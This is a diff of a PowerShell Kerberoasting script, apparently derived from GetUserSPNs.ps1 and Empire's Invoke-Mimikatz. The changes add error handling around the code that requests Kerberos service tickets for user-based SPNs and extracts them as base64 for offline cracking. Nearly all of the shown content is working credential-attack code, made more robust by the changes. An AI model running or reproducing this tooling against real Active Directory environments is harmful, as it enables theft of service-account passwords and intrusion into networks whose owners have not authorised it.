@@ -1,5 +1,5 @@
 # Note: This is a copy of https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1 and https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1
-#       Changes have been made to automate the process of requesting service tickets of interest in windows environemnts.  Some testing has been performed
+#       Changes have been made to automate the process of requesting service tickets of interest in windows environemnts.
 
 # Instructions:
 # To list ALL user-based SPNs, run:
@@ -187,7 +187,15 @@ function List-UserSPNs
           
           if ( $Request )
           {
-            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | out-null
+            try
+            {
+                New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | out-null
+            }
+            catch
+            {
+                # Error occured while requesting TGS ticket.
+            }
+            
           }
         }
   	  }
@@ -291,22 +299,30 @@ function Invoke-AutoKerberoast
     $i = 0
     ForEach ( $currentSPN in $SPNsArray )
     {
-        $ticketStartIndex = $kerbTickets.IndexOf($currentSPN)
-        $ticket = $kerbTickets.SubString($ticketStartIndex)
+        try
+        {
+            $ticketStartIndex = $kerbTickets.IndexOf($currentSPN)
+            $ticket = $kerbTickets.SubString($ticketStartIndex)
 
-        $ticketStartIndex = $ticket.IndexOf("====================")
-        $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before first break
+            $ticketStartIndex = $ticket.IndexOf("====================")
+            $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before first break
 
-        $ticketStartIndex = $ticket.IndexOf("====================")
-        $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before second break
+            $ticketStartIndex = $ticket.IndexOf("====================")
+            $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before second break
 
-        $ticketEndIndex = $ticket.IndexOf("====================")   
-        $ticket = $ticket.SubString(0, $ticketEndIndex)   # Grab everything up until the final break
+            $ticketEndIndex = $ticket.IndexOf("====================")   
+            $ticket = $ticket.SubString(0, $ticketEndIndex)   # Grab everything up until the final break
 
-        $currentUser = $DnameArray[$i]
-        Write-Output "`nBase64 encoded Kerberos ticket for `nDISTINGUISHED NAME: $currentUser `nSPN: $currentSPN` :::"
-        Write-Output $ticket
-
+            $currentUser = $DnameArray[$i]
+            Write-Output "`nBase64 encoded Kerberos ticket for `nDISTINGUISHED NAME: $currentUser `nSPN: $currentSPN` :::"
+            Write-Output $ticket
+        }
+        catch
+        {
+            Write-Output "`nBase64 encoded Kerberos ticket for `nDISTINGUISHED NAME: $currentUser `nSPN: $currentSPN` :::"
+            Write-Output "WARNING: Unable to obtain ticket"
+        }
+        
         $i += 1
     }  
 }
